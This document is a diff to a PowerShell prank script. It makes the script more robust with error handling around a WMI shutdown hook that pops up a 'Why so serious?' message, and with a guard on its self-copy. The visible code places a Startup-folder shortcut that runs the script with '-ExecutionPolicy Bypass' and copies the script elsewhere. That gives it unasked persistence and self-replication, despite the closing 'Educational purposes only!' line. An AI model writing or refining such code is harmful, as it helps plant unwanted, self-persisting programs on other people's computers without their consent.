@@ -44,7 +44,13 @@ function Show-ImageMessage {
     [System.Windows.MessageBox]::Show("Why so serious?", "System Notification", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Information)
 }
 
-Register-WmiEvent -Query "SELECT * FROM Win32_ComputerShutdownEvent" -Action { Show-ImageMessage }
+try {
+    Register-WmiEvent -Query "SELECT * FROM Win32_ComputerShutdownEvent" -Action {
+        Show-ImageMessage
+    }
+} catch {
+    Write-Host "WMI not available in this environment."
+}
 
 $startupShortcutPath = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\SetWallpaper.lnk"
 
@@ -55,7 +61,9 @@ if (-not (Test-Path $startupShortcutPath)) {
     $shortcut.Arguments = "-ExecutionPolicy Bypass -File `"$scriptPath`""
     $shortcut.Save()
 
-    Copy-Item $MyInvocation.MyCommand.Path $scriptPath1
+    if ($MyInvocation.MyCommand.Path -ne $scriptPath1) {
+        Copy-Item $MyInvocation.MyCommand.Path $scriptPath1
+    }
 }
 
 # Educational purposes only!
